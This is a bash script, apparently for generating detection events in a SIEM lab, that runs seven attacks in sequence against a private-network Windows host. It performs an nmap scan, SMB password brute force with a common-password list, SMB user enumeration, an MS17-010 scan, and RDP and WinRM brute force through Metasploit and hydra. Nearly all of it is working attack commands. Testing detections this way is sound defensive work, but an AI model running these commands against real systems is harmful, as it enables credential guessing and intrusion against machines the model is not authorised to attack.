#!/bin/bash
echo "========================================="
echo "SIEM Attack Script - Phase 1 and 2"
echo "========================================="
TARGET="192.168.56.101"
PASSFILE="/tmp/passwords.txt"

echo "[*] Creating password file..."
echo -e "password\n123456\nadmin\nAdministrator\nP@ssw0rd\nWelcome1\nwindows\nletmein\nqwerty" > $PASSFILE

echo ""
echo "[1/7] Attack 1 - Nmap Reconnaissance..."
nmap -sV -O -A $TARGET -oN /tmp/nmap_results.txt
echo "[*] Nmap complete. Waiting 30 seconds..."
sleep 30

echo ""
echo "[2/7] Attack 2 - SMB Brute Force..."
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser Administrator; set PASS_FILE $PASSFILE; set VERBOSE false; run; exit"
echo "[*] SMB brute force complete. Waiting 30 seconds..."
sleep 30

echo ""
echo "[3/7] Attack 3 - Authenticated SMB Login..."
msfconsole -q -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $TARGET; set SMBUser Administrator; set SMBPass PUT_YOUR_PASSWORD_HERE; set VERBOSE false; run; exit"
echo "[*] Authenticated login complete. Waiting 30 seconds..."
sleep 30

echo ""
echo "[4/7] Attack 4 - SMB User Enumeration..."
msfconsole -q -x "use auxiliary/scanner/smb/smb_enumusers; set RHOSTS $TARGET; set VERBOSE false; run; exit"
echo "[*] User enumeration complete. Waiting 30 seconds..."
sleep 30

echo ""
echo "[5/7] Attack 5 - MS17-010 Vulnerability Scan..."
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $TARGET; set VERBOSE false; run; exit"
echo "[*] Vulnerability scan complete. Waiting 30 seconds..."
sleep 30

echo ""
echo "[6/7] Attack 6 - RDP Brute Force..."
hydra -l Administrator -P $PASSFILE rdp://$TARGET -t 4 -W 3
echo "[*] RDP brute force complete. Waiting 30 seconds..."
sleep 30

echo ""
echo "[7/7] Attack 7 - WinRM Brute Force..."
while read pass; do
msfconsole -q -x "use auxiliary/scanner/winrm/winrm_login; set RHOSTS $TARGET; set USERNAME Administrator; set PASSWORD $pass; set VERBOSE false; run; exit" 2>/dev/null
done < $PASSFILE
echo "[*] WinRM brute force complete."

echo ""
echo "========================================="
echo "All attacks complete - Check dashboard"
echo "========================================="
